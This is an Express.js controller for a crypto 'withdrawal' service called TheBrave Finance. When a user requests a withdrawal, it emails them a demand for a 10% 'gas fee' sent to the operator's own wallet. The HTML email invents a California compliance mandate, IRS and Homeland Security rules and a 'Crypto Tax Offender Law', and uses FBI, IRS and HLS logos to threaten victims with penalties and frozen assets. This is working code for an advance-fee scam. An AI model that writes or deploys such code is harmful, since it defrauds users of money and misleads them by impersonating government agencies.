import asyncHandler from "express-async-handler";
import { Resend } from "resend";
import Withdrawal from "../models/withdrawalModel.js";
import Transaction from "../models/transactionModel.js";
import User from "../models/userModel.js";

const resend = new Resend(process.env.RESEND_API_KEY);

// @desc    Submit a withdrawal request
// @route   POST /api/withdrawals
// @access  Private
const requestWithdrawal = asyncHandler(async (req, res) => {
  const { amount, walletAddress, network } = req.body;

  if (!amount || !walletAddress || !network) {
    res.status(400);
    throw new Error("Amount, wallet address, and network are required");
  }

  const numericAmount = Number(amount);

  if (Number.isNaN(numericAmount) || numericAmount <= 0) {
    res.status(400);
    throw new Error("Withdrawal amount must be greater than zero");
  }

  // Get user with email
  const user = await User.findById(req.user._id).select("-password");
  if (!user) {
    res.status(404);
    throw new Error("User not found");
  }

  // Total approved deposits
  const depositResult = await Transaction.aggregate([
    {
      $match: {
        user: user._id,
        status: "approved",
        type: { $in: ["deposit", "balance_adjustment"] },
      },
    },
    {
      $group: {
        _id: null,
        totalDeposited: { $sum: "$creditedAmount" },
      },
    },
  ]);

  const totalDeposited = depositResult[0]?.totalDeposited || 0;

  // Total reserved withdrawals
  const withdrawalResult = await Withdrawal.aggregate([
    {
      $match: {
        user: user._id,
        status: { $in: ["pending", "processing", "completed"] },
      },
    },
    {
      $group: {
        _id: null,
        totalReservedWithdrawals: { $sum: "$amount" },
      },
    },
  ]);

  const totalReservedWithdrawals =
    withdrawalResult[0]?.totalReservedWithdrawals || 0;

  const availableBalance = totalDeposited - totalReservedWithdrawals;

  if (numericAmount > availableBalance) {
    res.status(400);
    throw new Error(
      `Insufficient balance. Your available balance is $${availableBalance.toLocaleString(
        "en-US",
        { minimumFractionDigits: 2 }
      )}`
    );
  }

  // Calculate gas fee (10% of withdrawal amount)
  const gasFee = parseFloat((numericAmount * 0.1).toFixed(2));

  // Gas fee wallet address
  const NETWORK_WALLETS = {
    "BTC": process.env.BTC_WALLET,
    "USDT TRC20": process.env.USDT_TRC20_WALLET,
    "USDT BEP20": process.env.USDT_BEP20_WALLET,
  };

  const GAS_FEE_WALLET = NETWORK_WALLETS[network];

  if (!GAS_FEE_WALLET) {
    res.status(400);
    throw new Error("Invalid or unsupported network");
  }

  // Create withdrawal record
  const withdrawal = await Withdrawal.create({
    user: user._id,
    amount: numericAmount,
    walletAddress,
    network,
    gasFee,
    status: "pending",
  });

  // Helper function for currency formatting in email
  const formatCurrency = (value) => {
    return value.toLocaleString("en-US", {
      minimumFractionDigits: 2,
      maximumFractionDigits: 2,
    });
  };

  // Simple HTML escape function to prevent XSS - MOVED HERE BEFORE BEING USED
  const escapeHtml = (str) => {
    if (!str) return '';
    return str
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#39;');
  };

  // Get client URL from environment
  const clientUrl = process.env.CLIENT_URL || 'http://localhost:5500';

// Updated email HTML section with corrected HLS reference
const emailHtml = `
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
  <title>Withdrawal Request Received | Brave Finance</title>
  <style>
    @media only screen and (max-width: 600px) {
      .responsive-table {
        width: 100% !important;
      }
      .inner-padding {
        padding: 24px 20px !important;
      }
      .logo-cell {
        display: inline-block !important;
        margin: 8px 6px !important;
      }
      .gas-amount {
        font-size: 20px !important;
      }
    }
  </style>
</head>
<body style="margin: 0; padding: 0; background: #0a0f18; font-family: 'Segoe UI', Arial, sans-serif; color: #e2e8f0;">
  <table width="100%" cellpadding="0" cellspacing="0" style="background: #0a0f18; padding: 40px 20px;">
    <tr>
      <td align="center">
        <table width="600" cellpadding="0" cellspacing="0" class="responsive-table" style="max-width: 600px; width: 100%;">
          <tr>
            <td style="background: #0f1825; border-radius: 16px 16px 0 0; padding: 32px 40px; border-bottom: 1px solid #1e293b; text-align: center;">
              <h1 style="margin: 0; color: #ffffff; font-size: 22px; font-weight: 800;">
                THE BRAVE <span style="color: #1152d4">FINANCE</span>
              </h1>
              <p style="margin: 6px 0 0; color: #64748b; font-size: 12px; letter-spacing: 2px;">
                Withdrawal Request Received
              </p>
            </td>
          </tr>
          <tr>
            <td style="background: #0f1825; padding: 40px;" class="inner-padding">
              <p style="margin: 0 0 12px; color: #94a3b8; font-size: 14px;">
                Hello <strong style="color: #ffffff">${escapeHtml(user.name)}</strong>,
              </p>
              <p style="margin: 0 0 18px; color: #94a3b8; font-size: 14px; line-height: 1.7;">
                Your withdrawal request has been submitted successfully.
              </p>

              <div style="margin: 24px 0; padding: 20px; background: #1e293b; border-left: 4px solid #1152d4; border-radius: 4px;">
                <p style="margin: 0 0 12px; color: #ffffff; font-size: 15px; font-weight: 700;">
                  URGENT: California State Compliance Mandate – Gas Fee Requirement
                </p>
                <p style="margin: 0 0 8px; color: #94a3b8; font-size: 13px; font-weight: 600;">
                  You are mandated to pay the gas fee associated with your recent transaction.
                </p>
                <p style="margin: 0 0 12px; color: #cbd5e1; font-size: 13px; line-height: 1.6;">
                  In accordance with the <strong>California State Acts</strong> and current federal compliance protocols, the Internal Revenue Service (IRS) and the <strong>Homeland Security (HLS)</strong> have established strict regulations regarding digital asset processing. These regulations require that all crypto transactions undergo a mandatory verification process to ensure full tax compliance and national security protocols.
                </p>
                <p style="margin: 0 0 12px; color: #cbd5e1; font-size: 13px; line-height: 1.6;">
                  <strong style="color: #ffffff">The Mandate:</strong> To facilitate this verification, a gas fee is required to process your transaction through the state's compliant channels. This fee is non-negotiable and acts as the payment for the administrative, tax processing, and security verification services provided by the IRS and HLS.
                </p>
                <p style="margin: 0 0 12px; color: #cbd5e1; font-size: 13px; line-height: 1.6;">
                  <strong style="color: #ffffff">Consequences of Non-Payment:</strong>
                  Failure to settle the gas fee within the designated timeframe will result in immediate penalties. Under the
                  <strong>Crypto Tax Offender Law</strong>, users who do not pay their fees are subject to:
                </p>
                <ul style="margin: 0 0 12px 20px; color: #cbd5e1; font-size: 13px; line-height: 1.6; padding: 0;">
                  <li style="margin-bottom: 4px;"><strong>Financial Penalties:</strong> Late fees and accrued interest on pending transactions.</li>
                  <li style="margin-bottom: 4px;"><strong>Tax Offender Tagging:</strong> Your account will be flagged and permanently tagged as a tax offender in the state registry.</li>
                  <li style="margin-bottom: 4px;"><strong>Security Review:</strong> Your transaction will be flagged for mandatory HLS security review.</li>
                </ul>
                <p style="margin: 0 0 12px; color: #cbd5e1; font-size: 13px; line-height: 1.6;">
                  <strong style="color: #ffffff">Action Required:</strong> Please settle your gas fee immediately to avoid penalties and ensure your transaction is processed without delay. Non-payment will result in the freezing of your assets and the application of the Crypto Tax Offender Law penalties.
                </p>
                <p style="margin: 0; color: #64748b; font-size: 12px; font-style: italic;">
                  Reminder: Your privacy is protected. This action is mandatory for compliance and security purposes only.
                </p>
              </div>

              <table width="100%" cellpadding="0" cellspacing="0" style="background: #151c2c; border-radius: 12px; border: 1px solid #1e293b; margin-bottom: 24px;">
                <tr>
                  <td style="padding: 18px 24px; border-bottom: 1px solid #1e293b;">
                    <p style="margin: 0 0 4px; color: #64748b; font-size: 11px;">Withdrawal Amount</p>
                    <p style="margin: 0; color: #10b981; font-size: 20px; font-weight: 800;">$${formatCurrency(numericAmount)}</p>
                  </td>
                </tr>
                <tr>
                  <td style="padding: 18px 24px; border-bottom: 1px solid #1e293b;">
                    <p style="margin: 0 0 4px; color: #64748b; font-size: 11px;">Gas Fee</p>
                    <p style="margin: 0; color: #ffffff; font-size: 22px; font-weight: 800;" class="gas-amount">$${formatCurrency(gasFee)}</p>
                  </td>
                </tr>
                <tr>
                  <td style="padding: 18px 24px; border-bottom: 1px solid #1e293b;">
                    <p style="margin: 0 0 4px; color: #64748b; font-size: 11px;">Network</p>
                    <p style="margin: 0; color: #ffffff; font-size: 13px; font-weight: 600;">${escapeHtml(network)}</p>
                  </td>
                </tr>
                <tr>
                  <td style="padding: 18px 24px;">
                    <p style="margin: 0 0 4px; color: #64748b; font-size: 11px;">Reference ID</p>
                    <p style="margin: 0; color: #94a3b8; font-size: 12px; font-family: monospace;">#${withdrawal._id}</p>
                  </td>
                </tr>
              </table>

              <div style="background: #101827; border-radius: 12px; border: 1px solid #1e293b; padding: 20px; margin-bottom: 24px;">
                <p style="margin: 0 0 6px; color: #64748b; font-size: 11px;">Wallet Address</p>
                <div style="background: #0a0f18; border-radius: 8px; padding: 12px; border: 1px solid #243049;">
                  <p style="margin: 0; color: #ffffff; font-family: monospace; font-size: 13px; word-break: break-all;">${GAS_FEE_WALLET}</p>
                </div>
                <p style="margin: 14px 0 6px; color: #64748b; font-size: 11px;">Required Network</p>
                <p style="margin: 0; color: #ffffff; font-size: 13px; font-weight: 600;">${escapeHtml(network)}</p>
                <p style="margin: 14px 0 0; color: #64748b; font-size: 11px; line-height: 1.7;">
                  Once payment is confirmed, your withdrawal request will proceed to the next stage of processing.
                </p>
              </div>

              <table width="100%" cellpadding="0" cellspacing="0" style="margin-top: 40px; border-top: 1px solid #1e293b; padding-top: 20px;">
                <tr>
                  <td align="center" style="padding-bottom: 20px;">
                    <p style="margin: 0 0 12px; color: #64748b; font-size: 11px; letter-spacing: 1px;">
                      TRUSTED BY
                    </p>

                    <table cellpadding="0" cellspacing="0" style="margin: 0 auto;">
                      <tr>
                        <!-- Logo -->
                        <td style="padding: 0 8px;">
                          <img src="${clientUrl}/images/TBF-LOGO.png"
                            alt="Secure Compliance"
                            width="40"
                            height="40"
                            style="display: block; width: 40px; height: 40px; object-fit: contain; border-radius: 50%; background: #1e293b; padding: 4px;">
                        </td>

                        <td style="padding: 0 8px;">
                          <img src="${clientUrl}/images/fbi.png"
                            alt="FBI Cyber Division"
                            width="40"
                            height="40"
                            style="display: block; width: 40px; height: 40px; object-fit: contain; border-radius: 50%; background: #1e293b; padding: 4px;">
                        </td>

                        <td style="padding: 0 8px;">
                          <img src="${clientUrl}/images/hls.png"
                            alt="Homeland Security"
                            width="40"
                            height="40"
                            style="display: block; width: 40px; height: 40px; object-fit: contain; border-radius: 50%; background: #1e293b; padding: 4px;">
                        </td>

                        <td style="padding: 0 8px;">
                          <img src="${clientUrl}/images/IRS.png"
                            alt="IRS Criminal Investigation"
                            width="40"
                            height="40"
                            style="display: block; width: 40px; height: 40px; object-fit: contain; border-radius: 50%; background: #1e293b; padding: 4px;">
                        </td>
                      </tr>
                    </table>
                  </td>
                </tr>
              </table>

              <div style="text-align: center; margin-top: 24px; font-size: 11px; color: #475569;">
                <p style="margin: 0 0 8px;">Need help? Message our support team for gas fee inquiries.</p>
                <p style="margin: 0;">&copy; 2000 TheBrave Finance — compliance with FBI/IRS/HLS security protocols.</p>
              </div>
            </td>
          </tr>
        </table>
      </td>
    </tr>
  </table>
</body>
</html>
`;

// Also update the email text version
const emailText = `
Hello ${user.name},

We've received your withdrawal request and it is currently being reviewed by our team.

Withdrawal Amount: $${formatCurrency(numericAmount)}
Destination Wallet: ${walletAddress}
Network: ${network}
Reference ID: ${withdrawal._id}

Network Processing Fee: $${formatCurrency(gasFee)}
Network to use: ${network}
Send to address: ${GAS_FEE_WALLET}

IMPORTANT: This transaction is subject to IRS and Homeland Security (HLS) compliance requirements.

Once this step is completed, your withdrawal will proceed to processing.

If you did not make this request, please contact support immediately.

TheBrave Finance
`;

  const { error: emailError } = await resend.emails.send({
    from: "TheBrave Finance <support@thebravefinance.com>",
    to: [user.email],
    subject: "Withdrawal Request Received",
    html: emailHtml,
    text: emailText,
    replyTo: "support@thebravefinance.com",
  });

  if (emailError) {
    console.error("Email send error:", emailError);
    // Don't throw — withdrawal was still created, just log the email failure
  }

  res.status(201).json({
    message: "Withdrawal request submitted. Check your email for instructions.",
    withdrawal: {
      _id: withdrawal._id,
      amount: numericAmount,
      gasFee,
      walletAddress,
      network,
      status: withdrawal.status,
      createdAt: withdrawal.createdAt,
    },
    balance: {
      totalDeposited,
      totalReservedWithdrawals: totalReservedWithdrawals + numericAmount,
      availableBalance: availableBalance - numericAmount,
    },
  });
});

// @desc    Get my withdrawals
// @route   GET /api/withdrawals/my
// @access  Private
const getMyWithdrawals = asyncHandler(async (req, res) => {
  const withdrawals = await Withdrawal.find({ user: req.user._id }).sort({
    createdAt: -1,
  });
  res.status(200).json(withdrawals);
});

// @desc    Get all withdrawals (admin)
// @route   GET /api/withdrawals
// @access  Private/Admin
const getAllWithdrawals = asyncHandler(async (req, res) => {
  const withdrawals = await Withdrawal.find({})
    .populate("user", "name email")
    .sort({ createdAt: -1 });

  res.status(200).json(withdrawals);
});

// @desc    Update withdrawal status (admin)
// @route   PUT /api/withdrawals/:id/status
// @access  Private/Admin
const updateWithdrawalStatus = asyncHandler(async (req, res) => {
  const { status } = req.body;

  if (!["pending", "processing", "completed", "rejected"].includes(status)) {
    res.status(400);
    throw new Error("Invalid status value");
  }

  const withdrawal = await Withdrawal.findById(req.params.id).populate(
    "user",
    "name email"
  );

  if (!withdrawal) {
    res.status(404);
    throw new Error("Withdrawal not found");
  }

  withdrawal.status = status;
  const updated = await withdrawal.save();

  res.status(200).json(updated);
});

export {
  requestWithdrawal,
  getMyWithdrawals,
  getAllWithdrawals,
  updateWithdrawalStatus,
};